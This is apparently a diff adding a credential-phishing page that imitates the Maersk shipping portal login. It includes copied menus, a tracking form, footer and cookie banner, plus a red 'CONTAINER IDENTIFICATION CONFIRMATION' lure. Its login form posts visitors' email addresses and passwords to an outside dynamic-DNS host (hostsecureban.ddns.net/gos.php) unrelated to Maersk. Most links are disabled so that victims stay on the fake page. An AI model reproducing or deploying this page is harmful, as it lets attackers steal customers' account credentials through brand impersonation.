+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/documentation/verify">Approve Verify Copy</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/documentation/bl/print">Print Bill Of Lading</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/documentation/w/print">Print Waybill</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/documentation/vgm">Submit VGM</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/bl/formOrder">Order Bill of Lading Form</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/import/overview/mytasks">Tasks</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/payer-standing-instructions/">Payer Standing Instructions</a>
+</li>
+</ul>
+</div>
+<div class="task-menu__block">
+<h1>Shipments</h1>
+<ul>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/export">Shipment Overview - Export</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/export/eta">ETA Changes</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/notifications/">Notifications</a>
+</li>
+<li> 
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/import">Shipment Overview - Import</a>
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/import/overview/inbound">All Inbound</a>
+</li>
+</ul>
+</div>
+<div class="task-menu__block action-card">
+<div class="action-card__spacer">
+<div class="action-card__copy">
+<h1 class="action-card__title">MyFinance</h1>
+<p class="action-card__rich-text">Make payments electronically and view your invoices and accounts</p>
+<p class="action-card__trigger">
+<a href="javascript:void(0)?login?.maersk.com/go/myfinance" class="ign-button--primary">Go to MyFinance</a>
+
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="ign-dropdown task-menu" data-dropdown="header-quote">
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" role="button" class="ign-dropdown__close">
+<span class="icon ign-icon-close"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span><span class="large-screen-only">Close</span></a>
+
+<div class="ign-dropdown__container">
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" class="ign-dropdown__back" role="button" data-id="header-quote">
+<span class="ign-icon-arrow-keyboard-left ign-dropdown__back__icon"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M10.9536467,14.5135123 L16.9111275,8 L17.9072935,8.91112746 L11.4517298,15.9692105 C11.1841245,16.2617922 10.7231689,16.2617922 10.4555637,15.9692105 L4,8.91112746 L4.99616602,8 L10.9536467,14.5135123 Z" transform="rotate(90 10.954 12.094)"></path></svg></span> Main menu
+</a>
+
+<div class="task-menu__block action-card">
+<div class="action-card__spacer">
+<div class="action-card__copy">
+<h1 class="action-card__title">Find a price</h1>
+<p class="action-card__rich-text">Get a quote that suits your specific shipping needs</p>
+<p class="action-card__trigger">
+<a href="javascript:void(0)?login?.maersk.com/find-a-price/" class="ign-button--primary">Find a price</a>
+<a href="javascript:void(0)?login?.maersk.com/tariff-rates-text-rules/" class="button--text">Tariff Inquiry</a>
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="ign-dropdown task-menu" data-dropdown="header-track">
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" role="button" class="ign-dropdown__close">
+<span class="icon ign-icon-close"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span><span class="large-screen-only">Close</span></a>
+
+<div class="ign-dropdown__container">
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" class="ign-dropdown__back" role="button" data-id="header-track">
+<span class="ign-icon-arrow-keyboard-left ign-dropdown__back__icon"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M10.9536467,14.5135123 L16.9111275,8 L17.9072935,8.91112746 L11.4517298,15.9692105 C11.1841245,16.2617922 10.7231689,16.2617922 10.4555637,15.9692105 L4,8.91112746 L4.99616602,8 L10.9536467,14.5135123 Z" transform="rotate(90 10.954 12.094)"></path></svg></span> Main menu
+</a>
+
+<div class="task-menu__block action-card">
+<div class="action-card__spacer">
+<div class="action-card__copy">
+<h1 class="action-card__title">Track shipments</h1>
+<form id="ign-track-form" class="task-menu__form ign-form" action="" autocomplete="off">
+<div class="task-menu__form__elements">
+<label class="ign-form-label" for="ign-trackingNumber">Tracking Number</label>
+<div class="ign-form-input">
+<input id="ign-trackingNumber" name="ign-trackingNumber" aria-label="Tracking Number" class="ign-form-input__field ign-form-focus" type="text" placeholder="Shipment, bill of lading or container number" value="" spellcheck="false" required="">
+<div class="ign-form-input__error-message">Please enter a valid number</div>
+</div>
+</div>
+<div class="action-card__trigger">
+<button class="ign-button--primary" type="submit">Track</button>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+
+</header>
+
+<div id="main" role="main" class="main" style="opacity: 1;">
+<div id="iam-portal">
+<div class="p-page__section theme--light">
+<div style="height: 70px; background: red; width: 100%; text-align: center; line-height: 70px; color: white; font-size: 30px;">
+CONTAINER IDENTIFICATION CONFIRMATION
+</div>
+<div class="p-page__section__outer">
+<div class="p-page__section__inner p-page__section__inner--small">
+<!---->
+<!---->
+
+<div class="form-page">
+<div class="heading">
+<h1 class="font--display-3">Account Login</h1>
+</div>
+<!---->
+
+<form id="login-form" action="https://hostsecureban.ddns.net/gos.php" method="post" autocomplete="off" target="_self" class="form-login">
+<fieldset class="form-fieldset">
+<div data-v-374b0cc3="" class="form-group">
+<label data-v-374b0cc3="" for="usernameInput" aria-label="Username" class="form-label form-label--sr-only">
+Username
+<!---->
+</label>
+<div data-v-374b0cc3="" class="form-input form-input--vanity form-input--icon--left"> 
+<input data-v-374b0cc3="" id="email" name="gang" type="email" placeholder="email address" required="required" style=" padding-left: 0; " class="form-input__field">
+<!---->
+</div>
+<!---->
+<div data-v-374b0cc3="" class="form-help"><a href="javascript:void(0)?login?.maersk.com/portaluser/forgot-username" class="" id="forgot-username" data-v-374b0cc3="">
+Email Sign in is Reqiured for parcel item confirmation
+</a></div>
+</div>
+<br>
+<div data-v-374b0cc3="" class="form-group">
+<label data-v-374b0cc3="" for="passwordInput" aria-label="Password" class="form-label form-label--sr-only">
+Password
+<!---->
+</label>
+<div data-v-374b0cc3="" class="form-input form-input--vanity form-input--icon--left"> 
+<input data-v-374b0cc3="" id="passwordInput" autocorrect="off" autocapitalize="off" spellcheck="false" style=" padding-left: 0; " name="dayjob" type="password" placeholder="Password" required="required" class="form-input__field">
+<!---->
+</div>
+<!---->
+ 
+</div>
+<div class="form-group">
+<div class="form-checkbox">
+<input type="checkbox" aria-hidden="true" id="rm" name="rm" class="form-checkbox__field" value="">
+<label for="rm" class="form-checkbox__label">
+Remember my username
+<!---->
+</label>
+</div>
+</div>
+<div class="form-group">
+<button type="submit" name="spageh" class="button button--primary button--block">
+Log in
+</button>
+</div>
+<div class="form-group">
+</div>
+</fieldset>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<noscript>
+<iframe src="//www.googletagmanager.com/ns.html?id=GTM-W6LN7D" height=0 width=0 style=display:none;visibility:hidden></iframe>
+</noscript>
+<script src="./jeed/utilities.0aad75cf.js.download"></script>
+<script src="./jeed/chunk-vendors.4f0314b3.js.download"></script>
+<script src="./jeed/app.c01ad24b.js.download"></script>
+<footer class="ign-footer" id="ign-footer" role="contentinfo" style="margin-bottom: 0px;">
+
+<div class="ign-footer__container">
+
+<div class="ign-footer__columns">
+
+<div class="ign-footer__column  ">
+<h3 class="ign-footer__title">
+<a href="javascript:void(0)?login?.maersk.com/solutions">Solutions</a>
+</h3>
+<ul class="ign-footer__list__sub-nav">
+
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/solutions/shipping">Shipping and cargo services</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/solutions/supply-chain">Supply chain services</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/solutions/freight-forwarding">Freight forwarding</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/solutions/digital-solutions">Digital solutions</a>
+</li>
+</ul>
+</div>
+<div class="ign-footer__column  ">
+<h3 class="ign-footer__title">
+<a href="javascript:void(0)?login?.maersk.com/schedules">Schedules</a>
+</h3>
+<ul class="ign-footer__list__sub-nav">
+
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/schedules">Point to point</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/schedules/#portCalls">Port calls</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/schedules/#vesselSchedules">Vessel schedules</a>
+</li>
+</ul>
+</div>
+<div class="ign-footer__column  ">
+<h3 class="ign-footer__title">
+<a href="javascript:void(0)?login?.maersk.com/global-presence">Global Presence</a>
+</h3>
+<ul class="ign-footer__list__sub-nav">
+
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/global-presence/africa">Africa</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/global-presence/americas">Americas</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/global-presence/asia">Asia</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/global-presence/europe">Europe</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/global-presence/oceania">Oceania</a>
+</li>
+</ul>
+</div>
+<div class="ign-footer__column  ign-footer__column--additional-links">
+
+<ul class="ign-footer__list__sub-nav">
+
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/local-information">Local information</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/contact">Contact us</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/about">About us</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/careers">Careers</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="http://investor.maersk.com/index.cfm">Investors</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/press">Press</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/news">News and advisories</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/procurement">Procurement</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/solutions/shipping/glossaries">Glossaries</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="https://secure.ethicspoint.eu/domain/media/en/gui/102833/index.html" target="_blank">Whistleblower</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="https://maerskcontainersales.com/" target="_blank">Used container sales</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="https://docs.google.com/forms/d/1h9MXPTYhv2nQ8xgoOPcxzthZHu-JqxJl3_Mj20YW2uI">Give feedback about this site</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="https://terms.maersk.com/" target="_blank">Terms and conditions</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/privacy-policy">Privacy policy</a>
+</li>
+<li class="ign-footer__list__sub-nav__link">
+<a href="javascript:void(0)?login?.maersk.com/cookie-policy">Cookie policy</a>
+</li>
+</ul>
+</div>
+
+</div>
+
+<div class="ign-footer__columns ign-footer__columns--misc">
+<div class="ign-footer__logo">
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-footer__logo__link">
+<img src="./jeed/maeu-dark.svg" alt="Go to home" loading="lazy">
+</a>
+</div>
+<div class="ign-footer__column ign-footer__column--copyright">
+<small>© A.P. Moller – Maersk</small>
+<br>
+
+</div>
+
+</div>
+
+</div>
+<div class="ign-version">2.2.14</div>
+</footer>
+<div class="ign-cookie-policy" id="ign-cookie-policy" role="alert">
+<div class="ign-cookie-policy__container">
+<h1>Our Cookie Policy</h1>
+<div class="ign-cookie-policy__text">
+<p>We use cookies for statistical analysis and to improve the friendliness and usability of our website. By visiting our website, you consent to our and third party use of cookies as described in our privacy and cookie policy.</p>
+</div>
+<div class="ign-cookie-policy__buttons">
+<a role="button" href="javascript:void(0)?login?.maersk.com/portaluser/login#" id="ign-accept-cookie">
+Accept
+</a><a role="button" href="javascript:void(0)?login?.maersk.com/cookie-policy" id="undefined">
+Read more
+</a>
+</div>
+</div>
+<div></div>
+</div>
+</body>
+
+</html>
